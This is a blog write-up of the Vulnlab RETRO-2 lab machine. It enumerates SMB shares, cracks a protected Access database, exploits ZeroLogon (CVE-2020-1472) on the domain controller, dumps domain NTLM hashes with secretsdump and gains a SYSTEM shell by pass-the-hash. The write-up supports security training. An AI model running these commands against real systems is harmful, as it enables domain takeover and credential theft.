---
title: Vulnlab RETRO-2 Machine
date: 2025-10-31 00:00:00 +0000
categories: [WRITUPS, ACTIVE DIRECTORY]
tags: [activedirectory, zerplogon]     # TAG names should always be lowercase
---

# RETRO-2

IP : `10.10.77.74`

## Network Mapping

We start with an nmap scan to find an entry point.

```bash
# Nmap 7.95 scan initiated Wed Jun 25 18:02:47 2025 as: /usr/lib/nmap/nmap -sC -sV -p- -T4 -A -oN nmap_all.txt 10.10.107.6
Nmap scan report for 10.10.107.6
Host is up (0.20s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-25 22:14:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: RETRO2
|   NetBIOS_Domain_Name: RETRO2
|   NetBIOS_Computer_Name: BLN01
|   DNS_Domain_Name: retro2.vl
|   DNS_Computer_Name: BLN01.retro2.vl
|   DNS_Tree_Name: retro2.vl
|   Product_Version: 6.1.7601
|_  System_Time: 2025-06-25T22:15:32+00:00
| ssl-cert: Subject: commonName=BLN01.retro2.vl
| Not valid before: 2025-06-24T22:01:15
|_Not valid after:  2025-12-24T22:01:15
|_ssl-date: 2025-06-25T22:16:12+00:00; +1s from scanner time.
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

```

With the above output, we see that we have access to an Active Directory network with the following ports: 88, 135, 139, 389, and 445.

## File sharing enumeration

We are starting to see if we can find anything interesting in file sharing.

```bash
└─# smbclient  -L  \\\\10.10.77.74\\ 

Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.77.74 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

We see a shared Public folder. Let's see what we can find that's interesting.

```bash
└─# smbclient   \\\\10.10.77.74\\Public

Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Aug 17 10:30:37 2024
  ..                                  D        0  Sat Aug 17 10:30:37 2024
  DB                                  D        0  Sat Aug 17 08:07:06 2024
  Temp                                D        0  Sat Aug 17 07:58:05 2024

                6290943 blocks of size 4096. 1334694 blocks available
smb: \> cd DB\
smb: \DB\> dir
  .                                   D        0  Sat Aug 17 08:07:06 2024
  ..                                  D        0  Sat Aug 17 08:07:06 2024
  staff.accdb                         A   876544  Sat Aug 17 10:30:19 2024

                6290943 blocks of size 4096. 1332471 blocks available
smb: \DB\> 
```

We find a file named staff.accdb in the DB folder; this is a **Microsoft Access database** file. 

![Desktop View](/assets/img/sample/askforpassword.png){: .normal }

The file is password protected, so let's try to crack it with johntheripper.

- First, convert it to a format that John can use.

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro2]
└─# office2john staff.accdb > hash.txt                                                                                     
```

- I cracked it with this command.

```bash
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro2]
└─# john --show hash.txt 
staff.accdb:class08

1 password hash cracked, 0 left
```

## Initial access

After opening the file, we noticed some identifiers. 

![Desktop View](/assets/img/sample/codeldap.png){: .normal }

Now we are trying to verify whether the students obtained valid identifiers.

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro2]
└─# crackmapexec smb 10.10.77.74 -u 'ldapreader' -p ppYaVcB5R
SMB         10.10.77.74     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.77.74     445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R 
```

We see that we have valid credentials, with which we can:
- Use Bloodhound for enumeration (I didn't find anything interesting)
- Try to connect with evil-winrm (which didn't work, as the user is not in a remote access group)
- Enumerate available users and groups using crackmapexec
- Find ASREPROAST accounts

But this time I tried listing with nxc, testing the different modules through SMB. And when testing zeroLogon, I saw that it worked well.

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro2]
└─# nxc smb retro2.vl -u 'ldapreader'  -p ppYaVcB5R -M zerologon
SMB         10.10.77.74     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) 
SMB         10.10.77.74     445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R 
ZEROLOGON   10.10.77.74     445    BLN01            VULNERABLE
ZEROLOGON   10.10.77.74     445    BLN01            Next step: https://github.com/dirkjanm/CVE-2020-1472

```

We download our scripts here 

[https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

```bash
┌──(root㉿kali)-[/opt/CVE-2020-1472]
└─# python cve-2020-1472-exploit.py  BLN01 10.10.77.74
Performing authentication attempts...
====================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!

```

- BLN01 the hostname of the DC

I was inspired by this video to move forward. 

[https://www.youtube.com/watch?v=2YNj5yTy0V0&t=10s](https://www.youtube.com/watch?v=2YNj5yTy0V0&t=10s)

So, in summary, as shown in the result above, the exploit was successful and changed the account password to an empty password with the following hash: 31d6cfe0d16ae931b73c59d7e0c089c0
So I did a remote dump with secretsdump. 

```bash
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'retro2.vl/BLN01$@10.10.118.1'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c06552bdb50ada21a7c74536c231b848:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e242a90fb9503f383255a4328e75756:::
admin:1000:aad3b435b51404eeaad3b435b51404ee:c06552bdb50ada21a7c74536c231b848:::
Julie.Martin:1105:aad3b435b51404eeaad3b435b51404ee:cf4999af837f40d72d1c5bcec27ba9b6:::
Clare.Smith:1106:aad3b435b51404eeaad3b435b51404ee:a7c82ec08414f0c54637fad20b9aac9e:::
Laura.Davies:1107:aad3b435b51404eeaad3b435b51404ee:ee74607fad6d8c51b0d488e322f82317:::
Rhys.Richards:1108:aad3b435b51404eeaad3b435b51404ee:09377f210fdbdcda6f97eda91ddc6879:::
Leah.Robinson:1109:aad3b435b51404eeaad3b435b51404ee:6333c620221c04d8fb5b6d7ca8b6d6d7:::
Michelle.Bird:1110:aad3b435b51404eeaad3b435b51404ee:c823220a9bda3ca70ebe7362187c9004:::
Kayleigh.Stephenson:1111:aad3b435b51404eeaad3b435b51404ee:a78835f0139b3b206f9598fe9c18d707:::
Charles.Singh:1112:aad3b435b51404eeaad3b435b51404ee:432119e62a10aff8c8200e4f45e772a0:::
Sam.Humphreys:1113:aad3b435b51404eeaad3b435b51404ee:3c1508fc774de1e6040c68b41a17fdee:::
Margaret.Austin:1114:aad3b435b51404eeaad3b435b51404ee:c6ebda46b0b014eda3ffcb8d92d179d9:::
Caroline.James:1115:aad3b435b51404eeaad3b435b51404ee:80835fee4ce88524f63a0ecf60870ac0:::
Lynda.Giles:1116:aad3b435b51404eeaad3b435b51404ee:dbf17856bd378ec410c20b98a749571f:::

```

We see that we have obtained the administrator's NTLM hash: aad3b435b51404eeaad3b435b51404ee:c06552bdb50ada21a7c74536c231b848; I can therefore use it to log in with impacket-psexec.

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro2]
└─# impacket-psexec retro.vl/administrator@retro2.vl -hashes aad3b435b51404eeaad3b435b51404ee:c06552bdb50ada21a7c74536c231b848
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on retro2.vl.....
[*] Found writable share ADMIN$
[*] Uploading file kPaAYnTj.exe
[*] Opening SVCManager on retro2.vl.....
[*] Creating service mGED on retro2.vl.....
[*] Starting service mGED.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami 
nt authority\system

C:\Windows\system32> 

```

After all, I looked for other methods, and I came across these blogs that tried a different approach:

[Retro2 - Vulnlab](https://seriotonctf.github.io/Retro2-Vulnlab/)

[Vulnlab - Retro2 Writeup](https://lfgberg.org/2025/05/17/vulnlab/retro2/)

[Vulnlab - Retro2](https://xavilok.es/vulnlab---retro2)